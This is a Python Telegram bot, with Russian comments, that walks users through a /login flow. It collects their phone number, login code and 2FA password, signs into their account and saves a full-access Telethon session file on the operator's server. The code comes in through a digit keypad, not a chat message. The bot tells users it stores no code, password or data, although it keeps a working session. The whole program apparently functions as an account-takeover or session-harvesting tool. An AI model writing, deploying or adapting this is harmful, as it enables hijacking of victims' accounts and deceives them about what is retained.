import os
import asyncio
from datetime import datetime
from dotenv import load_dotenv
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from telethon.sessions import SQLiteSession
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.types import UserFull

from telegram import (
    Update,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputMediaPhoto,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    ConversationHandler,
    filters,
)

# ----------------- Импорт из БД -----------------
from db import add_user, get_user, update_user

# ----------------- Загрузка переменных -----------------
load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("W_TOKEN")

SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

# ----------------- Состояния -----------------
ASK_AGREE, ASK_PHONE, WAIT_CODE, WAIT_2FA = range(4)

clients = {}
phones = {}
codes = {}
timeouts = {}
message_ids = {}

async def clear_previous_messages(chat, user_id):
    if user_id in message_ids:
        for msg_id in message_ids[user_id]:
            try:
                await chat.bot.delete_message(chat_id=chat.id, message_id=msg_id)
            except:
                pass
        del message_ids[user_id]

# ----------------- Клавиатура для кода -----------------
def get_code_keyboard():
    rows = [
        ["1", "2", "3"],
        ["4", "5", "6"],
        ["7", "8", "9"],
        ["0"]
    ]
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(txt, callback_data=f"code_{txt}") for txt in row]
        for row in rows
    ] + [[InlineKeyboardButton("⌫", callback_data="code_back")]])


# ----------------- Проверка валидности сессии -----------------
async def check_session_valid(user_id: int) -> TelegramClient | None:
    session_path = os.path.join(SESSIONS_DIR, str(user_id))
    if not os.path.exists(session_path + ".session"):
        return None

    client = TelegramClient(SQLiteSession(session_path), API_ID, API_HASH)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return None

        # Попробуем получить профиль — если не получится, сессия битая
        me = await client.get_me()
        if not me:
            await client.disconnect()
            return None

        return client
    except Exception as e:
        print(f"Session error for {user_id}: {e}")
        try:
            await client.disconnect()
        except:
            pass
        return None


# ----------------- Отправка профиля -----------------
async def send_profile(update: Update, client: TelegramClient):
    me = await client.get_me()
    full: UserFull = await client(GetFullUserRequest(me))

    # Фото
    photos = await client.get_profile_photos(me)
    photo_file = None
    if len(photos) > 0:
        photo_file = await client.download_profile_photo(me, file=bytes)
    
    # Био
    bio = getattr(full.full_user, 'about', None) or "Не указано"

    # Срок действия сессии
    expires = "Неограничено"
    if hasattr(client.session, 'expires') and client.session.expires:
        expires = datetime.fromtimestamp(client.session.expires).strftime("%d.%m.%Y %H:%M")

    # Формируем текст
    text = (
        f"Профиль: {me.first_name or ''} {me.last_name or ''}".strip() + "\n"
        f"@{me.username}\n"
        f"Телефон: <code>+{me.phone}</code>\n"
        f"Bio: {bio}\n"
        f"Сессия действительна до: <code>{expires}</code>"
    )

    if photo_file:
        await update.message.reply_photo(
            photo=photo_file,
            caption=text,
            parse_mode="HTML"
        )
    else:
        await update.message.reply_text(text, parse_mode="HTML")

    await client.disconnect()


# ----------------- /login -----------------
async def login_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)

    # Инициализируем список сообщений
    if user_id not in message_ids:
        message_ids[user_id] = []

    # Проверка: уже согласен?
    if not user or not user.agree:
        text = (
            "⚠️ Внимание! Этот процесс предназначен для входа в ваш Telegram-аккаунт через клиент (userbot).\n"
            "Бот не хранит ваш пароль, код или данные.\n"
            "Используя этот сервис, вы соглашаетесь с пользовательским соглашением.\n\n"
            "Нажмите ✅ Я согласен, чтобы продолжить."
        )
        kb = ReplyKeyboardMarkup([[KeyboardButton("✅ Я согласен")]], resize_keyboard=True)
        msg = await update.message.reply_text(text, reply_markup=kb)
        message_ids[user_id].append(msg.message_id)
        return ASK_AGREE

    # Пользователь согласился — проверяем сессию
    client = await check_session_valid(user_id)
    if client:
        msg = await update.message.reply_text("Сессия найдена. Проверяю...")
        message_ids[user_id].append(msg.message_id)

        # Очищаем "Проверяю..." и отправляем профиль
        try:
            await msg.delete()
        except:
            pass
        message_ids[user_id].remove(msg.message_id)

        await send_profile(update, client)
        await clear_previous_messages(update.effective_chat, user_id)
        return ConversationHandler.END

    # Сессии нет — начинаем вход
    msg = await update.message.reply_text("Сессия не найдена или недействительна. Вход...")
    message_ids[user_id].append(msg.message_id)

    kb = ReplyKeyboardMarkup([[KeyboardButton("📱 Отправить номер", request_contact=True)]], resize_keyboard=True)
    msg = await update.message.reply_text("Нажмите кнопку, чтобы отправить номер телефона", reply_markup=kb)
    message_ids[user_id].append(msg.message_id)
    return ASK_PHONE

# ----------------- Пользователь согласился -----------------
async def agree_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if text != "✅ Я согласен":
        return ASK_AGREE

    # Обновляем/создаём пользователя
    user = get_user(user_id)
    if not user:
        add_user(tg_id=user_id, agree=True)
    else:
        update_user(tg_id=user_id, agree=True)

    # Удаляем сообщение "Я согласен" и предыдущие
    try:
        await update.message.delete()
    except:
        pass

    await update.message.reply_text("Спасибо! Теперь отправьте номер телефона:", reply_markup=ReplyKeyboardRemove())
    kb = ReplyKeyboardMarkup([[KeyboardButton("📱 Отправить номер", request_contact=True)]], resize_keyboard=True)
    msg = await update.effective_chat.send_message("Нажмите кнопку, чтобы отправить номер телефона", reply_markup=kb)
    message_ids[user_id].append(msg.message_id)
    return ASK_PHONE


# ----------------- Получаем номер -----------------
async def phone_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if update.message.contact is None:
        return ASK_PHONE

    phone = update.message.contact.phone_number
    phones[user_id] = phone

    try:
        await update.message.delete()
    except:
        pass

    await update.effective_chat.send_message("Получен номер. Ожидаю код...", reply_markup=ReplyKeyboardRemove())

    session_path = os.path.join(SESSIONS_DIR, str(user_id))
    client = TelegramClient(session_path, API_ID, API_HASH)
    clients[user_id] = client
    await client.connect()

    try:
        await client.send_code_request(phone)
    except Exception as e:
        await update.effective_chat.send_message(f"Ошибка: {e}")
        return ConversationHandler.END

    codes[user_id] = ""
    timeouts[user_id] = asyncio.get_event_loop().call_later(
        60, lambda: asyncio.create_task(timeout_fail(user_id, update.effective_chat))
    )

    await update.effective_chat.send_message("Введите код:", reply_markup=get_code_keyboard())
    return WAIT_CODE


# ----------------- Таймаут -----------------
async def timeout_fail(user_id: int, chat):
    if user_id in clients:
        try:
            await clients[user_id].disconnect()
        except:
            pass
        del clients[user_id]

    codes.pop(user_id, None)
    phones.pop(user_id, None)
    timeouts.pop(user_id, None)
    await chat.send_message("⏳ Время на ввод кода истекло. Попробуйте снова: /login")


# ----------------- Ввод кода -----------------
async def code_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    data = query.data

    if data == "code_back":
        codes[user_id] = codes[user_id][:-1]
    else:
        digit = data.split("_")[1]
        codes[user_id] += digit

    dots = "●" * len(codes[user_id])
    await query.edit_message_text(f"Введите код:\n{dots}", reply_markup=get_code_keyboard())

    if len(codes[user_id]) == 5:
        return await finish_code(update, context)

    return WAIT_CODE


# ----------------- Завершаем ввод кода -----------------
async def finish_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id

    code = codes[user_id]
    client = clients[user_id]
    phone = phones[user_id]

    if user_id in timeouts:
        timeouts[user_id].cancel()
        del timeouts[user_id]

    try:
        await client.sign_in(phone=phone, code=code)
        await client.disconnect()
        await query.edit_message_text("✅ Вход выполнен. Сессия сохранена.")
        return ConversationHandler.END

    except SessionPasswordNeededError:
        await query.edit_message_text("Введите пароль 2FA:")
        return WAIT_2FA
    except PhoneCodeInvalidError:
        codes[user_id] = ""
        await query.edit_message_text("❌ Неверный код. Попробуйте снова:", reply_markup=get_code_keyboard())
        return WAIT_CODE
    except Exception as e:
        await query.edit_message_text(f"Ошибка входа: {e}")
        return ConversationHandler.END


# ----------------- 2FA -----------------
async def password_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    password = update.message.text.strip()
    client = clients[user_id]

    # УДАЛЯЕМ СООБЩЕНИЕ С ПАРОЛЕМ
    try:
        await update.message.delete()
    except:
        pass

    try:
        await client.sign_in(password=password)
        await client.disconnect()
        await update.effective_chat.send_message("✅ Успешный вход. Сессия сохранена.")
    except Exception as e:
        await update.effective_chat.send_message(f"Ошибка 2FA: {e}")

    # Очистка
    clients.pop(user_id, None)
    phones.pop(user_id, None)
    codes.pop(user_id, None)

    return ConversationHandler.END


# ----------------- Cancel -----------------
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Отменено.")
    user_id = update.effective_user.id
    if user_id in clients:
        try:
            await clients[user_id].disconnect()
        except:
            pass
        clients.pop(user_id, None)
    codes.pop(user_id, None)
    phones.pop(user_id, None)
    if user_id in timeouts:
        timeouts[user_id].cancel()
        del timeouts[user_id]
    return ConversationHandler.END


# ----------------- Main -----------------
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("login", login_start)],
        states={
            ASK_AGREE: [MessageHandler(filters.TEXT & ~filters.COMMAND, agree_received)],
            ASK_PHONE: [MessageHandler(filters.CONTACT, phone_received)],
            WAIT_CODE: [CallbackQueryHandler(code_input)],
            WAIT_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, password_handler)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True
    )

    app.add_handler(conv)

    print("Bot started.")
    app.run_polling()


if __name__ == "__main__":
    main()